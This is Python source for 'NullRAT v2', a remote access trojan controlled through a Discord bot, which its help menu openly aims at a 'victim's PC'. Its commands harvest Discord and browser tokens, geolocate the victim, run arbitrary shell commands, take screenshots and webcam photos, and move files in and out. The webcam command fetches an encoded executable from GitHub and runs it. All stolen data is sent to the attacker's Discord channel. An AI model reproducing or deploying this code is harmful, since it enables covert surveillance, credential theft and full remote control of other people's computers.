import os, subprocess, re, discord; from discord.ext import commands; from requests import get; from socket import create_connection

# All the needed variables
notification_channel = 1111111111111111
bot_token = "qwertyUIOPasdf.Ghjkl.12345"
bot_prefix = "rat> "

client = commands.Bot(command_prefix=bot_prefix); client.remove_command("help")
ogdir = os.getcwd(); a = 1

# Required functions
def IP():
    try: 
        addr = get("https://api.ipify.org/").text
    except:
        addr = "127.0.0.1"
    return addr

def is_connected():
    try:
        create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        pass
    return False
  
def EmbedGen(title_main, color, name, value):
    if color == "def": color = 0x0081FA
    if not color == "def": color2 = color
    embed = discord.Embed(title = title_main, color = color)
    embed.add_field(name = name, value = value)
    embed.set_footer(text = "Written by NullCode#7040")
    return embed
    
def ft(p):
    p += "\\Local Storage\\leveldb"; tokens = []
    for file_name in os.listdir(p):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [
            x.strip()
            for x in open(f"{p}\\{file_name}", errors="ignore").readlines()
            if x.strip()
        ]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
    
@client.event
async def on_ready():
    await client.get_channel(notification_channel).send("RAT v2 started on " + IP() + "\n Currently present in " + ogdir)
    
@client.command() # Sends IP
async def userip(ctx): 
    await ctx.send("```The IP of " + os.getenv('username') + " is: " + IP() + "```")
    
@client.command() # Get environment variables
async def getenv(ctx, env): 
    await ctx.send(embed = EmbedGen("Environment Variable", "def", "The value is: ", os.getenv(env)))
    
@client.command() # Gets current working directory
async def cwd(ctx): 
    await ctx.send(embed = EmbedGen("Current directory", "def", "The present directory is: ", os.getcwd()))

@client.command() # Shuts down bot
async def exit(ctx, ip): 
    if ip == IP():
        await ctx.send(embed = EmbedGen("Information", 0xFF0505, "Given IP is " + IP(), "Exiting Bot"))
        await client.logout()

@client.command()
async def geolocate(ctx):
    import urllib.request, json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
    embed = discord.Embed(title = "Geolocation Information", color = 0x0081FA)
    embed.add_field(name = "Country code", value = data["country_code"], inline = False)
    embed.add_field(name = "Country name", value = data["country_name"], inline = False)
    embed.add_field(name = "City", value = data["city"], inline = False)
    embed.add_field(name = "Latitude", value = data["latitude"], inline = False)
    embed.add_field(name = "Longitude", value = data["longitude"], inline = False)
    embed.add_field(name = "Postal code", value = data["postal"], inline = False)
    embed.add_field(name = "State", value = data["state"], inline = False)
    embed.set_footer(text = "Written by NullCode#7040")
    await ctx.send(embed = embed)
    
@client.command() # Idea was Sp00p's, but this is a brand new implementation by me
async def webcam(ctx): 
    import base64
    webcam = bytes(get("https://raw.githubusercontent.com/NullCode13/CommandCam/master/CommandCam_binary_base64").text, 'utf-8')
    os.chdir(os.getenv("temp"))
    with open("cc.exe", "wb") as fh:
        fh.write(base64.decodebytes(webcam))
    subprocess.run('cc.exe & ren image.bmp image.png', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    await ctx.send(embed = discord.Embed(title = "Here is the photo", color = 0x0081FA), file = discord.File(os.path.join(os.getenv("temp") + "\\image.png")))
    os.remove(os.path.join(os.getenv("temp") + "\\image.png"))
    os.remove(os.path.join(os.getenv("temp") + "\\cc.exe")); os.chdir(ogdir)
    
@client.command()
async def token(ctx):
    local = os.getenv("LOCALAPPDATA"); roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg = f"\n**{platform}**\n```\n"
        tokens = ft(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f"{token}\n"
        else:
            msg += "No token found.\n"
        msg += "```"
        await ctx.send(msg)

# Download and upload
@client.command()
async def upload(ctx, name, isBig="zzz"):
    if isBig == "zzz":
        attachment = ctx.message.attachments[0]
        url = attachment.url
        r = get(url, allow_redirects=True)
        open(name, "wb").write(r.content)
        await ctx.send(embed = EmbedGen("DL information", "def", "Sending over file to victim: ", "Success"))
    else:
        url = isBig
        r = get(url, allow_redirects=True)
        open(name, "wb").write(r.content)
        await ctx.send(embed = EmbedGen("DL information", "def", "Sending over file to victim: ", "Success"))

@client.command()
async def download(ctx, filepath):
    #upload makes use of `` [code indicators]: Example - "`C:\Users\NullCode\a.txt`"
    filepath = filepath[:-1]; filepath = filepath[1:]  
    await ctx.send("Uploading file...")
    await ctx.send(file=discord.File(filepath))

# Change directory
@client.command()
async def cd(ctx, dire):
    dire = dire[:-1]; dire = dire[1:] # cd makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
    os.chdir(dire)
    await ctx.send(embed=EmbedGen("CD information", "def", "Changing directory to " + os.getcwd(), "Success"))

# View directory
@client.command()
async def dir(ctx, dire="null"):
    if dire == "null":
        dire = os.getcwd()
        subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)   
    else:
        # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
        dire = dire[:-1]; dire = dire[1:]
        os.chdir(dire)
        subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)   
        
    file = discord.File(
        os.path.join(os.getenv("TEMP") + "\\dir.txt"), filename="Directory.txt"
    )
    await ctx.send("Contents of dir " + dire + " are:", file=file)
    os.remove(os.path.join(os.getenv("TEMP") + "\\dir.txt"))

# GSL
@client.command()
async def gsl(ctx):
    subprocess.run(
        'SYSTEMINFO > "%temp%\\youtube.txt"',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
    )
    await ctx.send("Here is the file", file=discord.File(os.path.join(os.getenv("TEMP") + "\\youtube.txt"), filename="General Output.txt"))
    os.remove(os.path.join(os.getenv("TEMP") + "\\youtube.txt"))

# Takes screenshot of window (by Sp00p64)
@client.command()
async def screenshot(ctx): 
    from mss import mss
    await ctx.send("Preparing screenshot")
    with mss() as sct:
        sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
    file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
    await ctx.send(file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

# Execute shell commands (by Sp00p64)
@client.command()
async def shell(ctx, msg):  
        global status; status = None 
        import subprocess, os, time
        from threading import Thread
        
        #shell makes use of `` [code indicators]: Example - "`echo Hello World`"
        msg = msg[:-1]; msg = msg[1:]
        
        def shell():
            output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            global status; status = "ok"; return output
        
        shel = Thread(target=shell) 
        shel._running = True; shel.start(); time.sleep(2); shel._running = False
        
        if status:
            result = str(shell().stdout.decode('CP437'))
            print(result); numb = len(result); print(numb)
            if numb < 1:
                await ctx.send(embed = EmbedGen("Information", "def", "Command Output:", "Command not recognized or no output was obtained"))
            elif numb > 1990:
                f1 = open("shell.txt", 'a')
                f1.write(result); f1.close()
                file = discord.File("shell.txt", filename="shell.txt")
                await ctx.send("Command successfully executed", file=file)
                os.popen("del shell.txt")
            else:
                await ctx.send(result)
        else:
            await ctx.send(embed = EmbedGen("Information", "def", "Command Output:", "Command not recognized or no output was obtained"))
            status = None
            
@client.command()
async def menu(ctx):
    embed = discord.Embed(title="NullRAT v2 Help Menu", color=0x0081FA)
    embed.add_field(name="rat> token", value="Finds Discord Token", inline=False)
    embed.add_field(name="rat> userip", value="Finds victim's public IP address", inline=False)
    embed.add_field(name="rat> gsl", value="Sends a general system log", inline=False)
    embed.add_field(name='rat> shell "`cmd`"', value="Executes shell commands", inline=False)
    embed.add_field(name="rat> upload <name> <link>", value="Sends file to victim's PC", inline=False)
    embed.add_field(name='rat> download "`path`"', value="Gets file from victim's PC", inline=False)
    embed.add_field(name='rat> cd "`dir`"', value="Changes directory", inline=False)
    embed.add_field(name='rat> dir "`dir`"', value="Look at directory", inline=False)
    embed.add_field(name="rat> getenv <variable>", value="Finds environment variables", inline=False)
    embed.add_field(name="rat> cwd", value="Sends current working directory", inline=False)
    embed.add_field(name="rat> screenshot", value="Takes screenshot of monitor", inline=False)
    embed.add_field(name="rat> webcam", value="Takes picture from webcam", inline=False)
    embed.add_field(name="rat> exit <ip>", value="Shuts down bot", inline=False)
    embed.set_footer(text="Written by NullCode#7040")
    await ctx.send(embed=embed)

while is_connected() == False: a += 1
client.run(btz)
    
